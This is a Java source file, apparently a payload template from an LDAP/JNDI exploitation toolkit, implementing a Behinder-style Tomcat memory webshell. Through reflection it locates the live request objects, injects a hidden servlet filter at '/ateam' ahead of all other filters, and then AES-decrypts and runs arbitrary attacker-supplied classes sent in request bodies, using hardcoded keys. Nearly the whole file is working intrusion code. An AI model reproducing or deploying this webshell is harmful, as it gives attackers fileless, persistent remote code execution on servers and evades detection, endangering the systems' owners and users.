package com.feihong.ldap.template;

import org.apache.catalina.LifecycleState;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;
import org.apache.coyote.RequestInfo;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.io.InputStream;
import java.io.Writer;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.EnumSet;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class BehinderFilter extends ClassLoader implements Filter{
    public String cs = "UTF-8";
    public String pwd = "eac9fa38330a7535";//pass1024
//    public String pwd = "02f2a5c80f47d495";

//    public String pwd = "26b4ec454ba458df"; //skysky
    public String path = "/ateam";
    public String filterName = "ateam666";
    public Request req = null;
    public Response resp = null;


    static {
        try {
            BehinderFilter behinderMemShell = new BehinderFilter();
            if (behinderMemShell.req != null && behinderMemShell.resp != null){
                behinderMemShell.addFilter();
            }
        } catch (Exception e){
        }
    }


    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public String md5(String s) {
        String ret = null;
        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).substring(0, 16);
        } catch (Exception var4) {
        }
        return ret;
    }

    public BehinderFilter()  {
        this.setParams();
    }

    public BehinderFilter(ClassLoader c) {
        super(c);
        this.setParams();
    }


    //找req和resp
    public void setParams(){
        try {
            boolean flag = false;
            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),"threads");
            for (int i=0;i<threads.length;i++){
                Thread thread = threads[i];
                if (thread != null){
                    String threadName = thread.getName();
                    if (!threadName.contains("exec") && threadName.contains("http")){
                        Object target = getField(thread,"target");
                        Object global = null;
                        if (target instanceof Runnable){
                            try {
                                global = getField(getField(getField(target,"this$0"),"handler"),"global");
                            } catch (NoSuchFieldException fieldException){
                                fieldException.printStackTrace();
                            }
                        }
                        if (global != null){
                            List processors = (List) getField(global,"processors");
                            for (i=0;i<processors.size();i++){
                                RequestInfo requestInfo = (RequestInfo) processors.get(i);
                                if (requestInfo != null){
                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) getField(requestInfo,"req");
                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
                                    Response response = request.getResponse();
                                    this.req = request;
                                    this.resp = response;
                                    flag = true;
                                    break;
                                }
                            }
                        }
                    }
                }
                if (flag){
                    break;
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }


    public String addFilter() throws Exception {
        //从request获取servletContext
        ServletContext servletContext = this.req.getServletContext();
        Filter filter = this;
        String filterName = this.filterName;
        String url = this.path;
        if (servletContext.getFilterRegistration(filterName) == null) {//测试内存马是否已经存在
            Field contextField = null;
            ApplicationContext applicationContext = null;
            StandardContext standardContext = null;
            Field stateField = null;
            FilterRegistration.Dynamic filterRegistration = null;

            String var11;
            try {
                //从servletContext获取applicationContext
                contextField = servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                applicationContext = (ApplicationContext)contextField.get(servletContext);
                //从applicationContext获取standardContext
                contextField = applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                standardContext = (StandardContext)contextField.get(applicationContext);
                //不知道这是在干啥。。。。
                stateField = LifecycleBase.class.getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext, LifecycleState.STARTING_PREP);
                //添加Filter
                filterRegistration = servletContext.addFilter(filterName, filter);
                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext, (Object[])null);
                stateField.set(standardContext, LifecycleState.STARTED);
                var11 = null;

                Class filterMap;
                try {
                    filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                } catch (Exception var22) {
                    filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
                }
                //反射获取filterMaps
                Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
                Object[] filterMaps = (Object[])((Object[])((Object[])findFilterMaps.invoke(standardContext)));
                for(int i = 0; i < filterMaps.length; ++i) {
                    Object filterMapObj = filterMaps[i];
                    findFilterMaps = filterMap.getMethod("getFilterName");
                    String name = (String)findFilterMaps.invoke(filterMapObj);
                    if (name.equalsIgnoreCase(filterName)) {
                        filterMaps[i] = filterMaps[0];
                        filterMaps[0] = filterMapObj;
                    }
                }
                String var25 = "Success";
                String var26 = var25;
                return var26;
            } catch (Exception var23) {
                var11 = var23.getMessage();
            } finally {
                stateField.set(standardContext, LifecycleState.STARTED);
            }

            return var11;
        } else {
            return "Filter already exists";
        }
    }

    public static Object getField(Object obj, String fieldName) throws Exception {
        Field f0 = null;
        Class clas = obj.getClass();

        while (clas != Object.class){
            try {
                f0 = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e){
                clas = clas.getSuperclass();
            }
        }

        if (f0 != null){
            f0.setAccessible(true);
            return f0.get(obj);
        }else {
            throw new NoSuchFieldException(fieldName);
        }
    }



    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpSession session = ((HttpServletRequest)req).getSession();
        Map obj = new HashMap();
        obj.put("request", req);
        obj.put("response", resp);
        obj.put("session", session);
        try {
            session.putValue("u", this.pwd);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(this.pwd.getBytes(), "AES"));
            (new BehinderFilter(this.getClass().getClassLoader())).g(c.doFinal(this.base64Decode(req.getReader().readLine()))).newInstance().equals(obj);
        } catch (Exception var7) {
            var7.printStackTrace();
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])((byte[])clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str)));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, str)));
        }
    }

    @Override
    public void destroy() {

    }
}